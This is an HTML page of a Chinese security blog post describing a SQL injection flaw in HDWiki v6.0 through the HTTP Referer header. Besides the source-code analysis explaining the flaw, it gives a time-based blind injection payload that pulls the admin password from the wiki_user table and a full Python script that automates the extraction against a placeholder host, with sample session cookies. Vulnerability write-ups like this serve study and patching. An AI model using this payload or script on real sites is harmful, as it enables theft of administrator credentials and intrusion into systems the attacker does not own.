<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>HDWiki v6.0最新版referer注入漏洞(每周一洞) - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>HDWiki v6.0最新版referer注入漏洞(每周一洞)</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2018-07-22 17:13</div>
  <div>
    <span><a href="https://getshe11.com/tags/hdwiki/">#HDWiki</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。</p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<p>6.0可以在官网下载：http://kaiyuan.hudong.com/download/
在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。</p>
<!-- raw HTML omitted -->
<h1 id="0x03-漏洞利用">0x03 漏洞利用</h1>
<h2 id="1-注册账号">1. 注册账号</h2>
<p><a href="http://sb.com/index.php?user-register">http://sb.com/index.php?user-register</a></p>
<h2 id="2-截获数据包">2. 截获数据包</h2>
<p><a href="http://sb.com/index.php?user-login,">http://sb.com/index.php?user-login,</a>
用burp或者其他工具截取数据包。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/HDWiki6/1.png" alt=""></p>
<h2 id="3-执行payload">3. 执行Payload</h2>
<p>在数据包下面加上referer：<code>referer:' where if((substr((select password from wiki_user where username='admin'),1,1))='e',sleep(5),0)#</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/HDWiki6/2.PNG" alt="">
看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。</p>
<h1 id="0x04-漏洞分析">0x04 漏洞分析</h1>
<p>文件<code>control/user.php</code>的110行<code>dologin()</code>函数，为什么要登录用户才有效呢，因为<code>$_ENV['user']</code>这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在<code>$_ENV['user']-&gt;add_referer();</code>这里。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dologin</span>(){
		
		$_ENV[<span style="color:#e6db74">&#39;user&#39;</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">passport_server</span>(<span style="color:#e6db74">&#39;login&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">post</span>[<span style="color:#e6db74">&#39;submit&#39;</span>])){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">view</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">assign</span>(<span style="color:#e6db74">&#39;checkcode&#39;</span>,<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;checkcode&#39;</span>])<span style="color:#f92672">?</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;checkcode&#39;</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>);

			$_ENV[<span style="color:#e6db74">&#39;user&#39;</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">add_referer</span>();
			$_ENV[<span style="color:#e6db74">&#39;user&#39;</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">passport_server</span>(<span style="color:#e6db74">&#39;login&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>);
			$_ENV[<span style="color:#e6db74">&#39;user&#39;</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">passport_client</span>(<span style="color:#e6db74">&#39;login&#39;</span>);

			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;name_min_length&#39;</span>])) {$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;name_min_length&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;}
			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;name_max_length&#39;</span>])) {$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;name_max_length&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>;}
			$loginTip2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;15&#39;</span>),<span style="color:#66d9ef">array</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;name_min_length&#39;</span>],$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;name_max_length&#39;</span>]),$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">view</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lang</span>[<span style="color:#e6db74">&#39;loginTip2&#39;</span>]);
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">view</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">assign</span>(<span style="color:#e6db74">&#39;name_min_length&#39;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;name_min_length&#39;</span>]);
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">view</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">assign</span>(<span style="color:#e6db74">&#39;name_max_length&#39;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setting</span>[<span style="color:#e6db74">&#39;name_max_length&#39;</span>]);
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">view</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">assign</span>(<span style="color:#e6db74">&#39;loginTip2&#39;</span>,$loginTip2);
			<span style="color:#75715e">//$this-&gt;view-&gt;display(&#39;login&#39;);
</span><span style="color:#75715e"></span>			$_ENV[<span style="color:#e6db74">&#39;block&#39;</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">view</span>(<span style="color:#e6db74">&#39;login&#39;</span>);
		}<span style="color:#66d9ef">else</span>{
</code></pre></div><p>继续跟进<code>add_referer()</code>函数的分析，<code>model\user.class.php</code>的41行，这里判断了<code>HTTP_REFERER</code>是否为真然后执行下面内容，可以看到把<code>$_SERVER['HTTP_REFERER']</code>带入UPDATE语句，但是有一个<code>haddslashes</code>函数的过滤。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">add_referer</span>(){
		<span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_REFERER&#39;</span>]){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;UPDATE &#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">DB_TABLEPRE</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;session SET referer =&#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::</span><span style="color:#a6e22e">haddslashes</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_REFERER&#39;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39; WHERE sid=&#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base</span><span style="color:#f92672">::</span><span style="color:#a6e22e">hgetcookie</span>(<span style="color:#e6db74">&#39;sid&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;&#34;</span>);
		}
	}
</code></pre></div><p>我们进入<code>haddslashes()</code>函数，在<code>lib\string.class.php</code>文件的125行，可以看到<code>MAGIC_QUOTES_GPC </code>如果PHP开启了GPC，那就不进行下面的过滤直接返回原字符串<code>$string</code>，所以就造成了SQL注入。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">haddslashes</span>($string, $force <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">MAGIC_QUOTES_GPC</span> <span style="color:#f92672">||</span> $force) {
			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_array</span>($string)) {
				<span style="color:#66d9ef">foreach</span>($string <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $val) {
					$string[$key] <span style="color:#f92672">=</span> <span style="color:#a6e22e">string</span><span style="color:#f92672">::</span><span style="color:#a6e22e">haddslashes</span>($val, $force);
				}
			}<span style="color:#66d9ef">else</span> {
				$string <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($string);
			}
		}
		<span style="color:#66d9ef">return</span> $string;
	}
</code></pre></div><h1 id="0x05-python脚本">0x05 Python脚本</h1>
<p>因为是盲注所以还是脚本跑比较省事，改进了一下原作者的脚本。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/HDWiki6/3.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> httplib
payloads <span style="color:#f92672">=</span> list(<span style="color:#e6db74">&#39;1234567890abcdefghijklmnopqrstuvwxyz&#39;</span>)<span style="color:#75715e">#匹配用到的字符串</span>
val <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
Cookies <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hd_sid=pUQ1Aq; PHPSESSID=jatvti3nlm2ro3i7oscke307e0; hd_auth=fa04EhT6qA%2BHMlu7IOesKoc8Xs</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">5b</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">d18B4obJ17nm7F%2BvPbknFWVkAx1u4CLLl75EzncqWZRI94cSDMjJEV&#39;</span>
url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/index.php?user-login&#39;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">32</span>):
    <span style="color:#66d9ef">for</span> payload <span style="color:#f92672">in</span> payloads:
        header <span style="color:#f92672">=</span>{
            <span style="color:#e6db74">&#39;Cookie&#39;</span>:Cookies,
            <span style="color:#e6db74">&#39;referer&#39;</span>:<span style="color:#e6db74">&#34;&#39;where if(substr((select password from wiki_user where username=&#39;admin&#39;),&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,1)=&#39;&#34;</span><span style="color:#f92672">+</span>payload<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;,sleep(3),0)#&#34;</span>,
        }
        <span style="color:#66d9ef">try</span>:
            conn <span style="color:#f92672">=</span> httplib<span style="color:#f92672">.</span>HTTPConnection(<span style="color:#e6db74">&#39;sb.com&#39;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
            conn<span style="color:#f92672">.</span>request(method<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;GET&#39;</span>,url<span style="color:#f92672">=</span>url,headers<span style="color:#f92672">=</span>header)
            start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>clock()
            html_doc<span style="color:#f92672">=</span>conn<span style="color:#f92672">.</span>getresponse()<span style="color:#f92672">.</span>read()
            end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>clock()
            dely<span style="color:#f92672">=</span>end<span style="color:#f92672">-</span>start
            <span style="color:#75715e">#print dely</span>
            <span style="color:#66d9ef">if</span>((dely)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">2</span>):
                val<span style="color:#f92672">+=</span>payload
                <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
            <span style="color:#66d9ef">pass</span>
        <span style="color:#66d9ef">finally</span>:
            conn<span style="color:#f92672">.</span>close()

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;password:&#39;</span><span style="color:#f92672">+</span>val
</code></pre></div><h1 id="0x06-结束">0x06 结束</h1>
<p>这个漏洞确实是比较鸡肋的，要PHP小于5.4版本并且开启GPC，现在PHP差不多都是5.6版本以上的。</p>
<h1 id="0x07-参考">0x07 参考</h1>
<p><a href="http://www.freebuf.com/vuls/170337.html">http://www.freebuf.com/vuls/170337.html</a></p>
<p><a href="https://github.com/F0r3at/Python-Tools/blob/master/sql_hdwiki6.py">https://github.com/F0r3at/Python-Tools/blob/master/sql_hdwiki6.py</a></p>
<p><a href="https://www.lanzous.com/i1hb0od">https://www.lanzous.com/i1hb0od</a> 源码</p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba">
                            0x02 环境搭建
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8">
                            0x03 漏洞利用
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1-%e6%b3%a8%e5%86%8c%e8%b4%a6%e5%8f%b7">
                            1. 注册账号
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2-%e6%88%aa%e8%8e%b7%e6%95%b0%e6%8d%ae%e5%8c%85">
                            2. 截获数据包
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#3-%e6%89%a7%e8%a1%8cpayload">
                            3. 执行Payload
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            0x04 漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-python%e8%84%9a%e6%9c%ac">
                            0x05 Python脚本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x06-%e7%bb%93%e6%9d%9f">
                            0x06 结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x07-%e5%8f%82%e8%80%83">
                            0x07 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
